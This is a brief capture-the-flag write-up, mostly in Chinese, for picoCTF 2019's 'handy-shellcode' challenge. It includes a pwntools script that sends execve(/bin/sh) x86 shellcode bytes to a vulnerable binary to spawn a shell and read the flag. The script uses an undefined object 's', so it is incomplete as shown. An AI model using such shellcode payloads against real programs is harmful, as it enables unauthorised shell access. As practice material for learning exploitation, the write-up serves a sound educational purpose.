# handy-shellcode - Points: 50
### This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af on the shell server. Source.

這題就是要我們塞一段shellcode去開shell

網路上一堆程式可以參考只要搜尋搜尋Linux/x86 - execve(/bin/sh)就會有很多結果可以參考

當然也可以自己手刻組合語言利用pwntool送

而我這邊是直接在網路上找到一段assembly code

送過去之後就會噴flag出來了

```python
from pwn import  *

path = "/problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af"
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

py = s.run('cd ' + path + ';' + './vuln')
#print py.recv()
py.recvuntil(':')
py.sendline(payload)
py.interactive()
```
![image](https://github.com/bohsiang/CTF_practice/blob/master/picoCTF2019/picture/handy-shellcode.PNG)


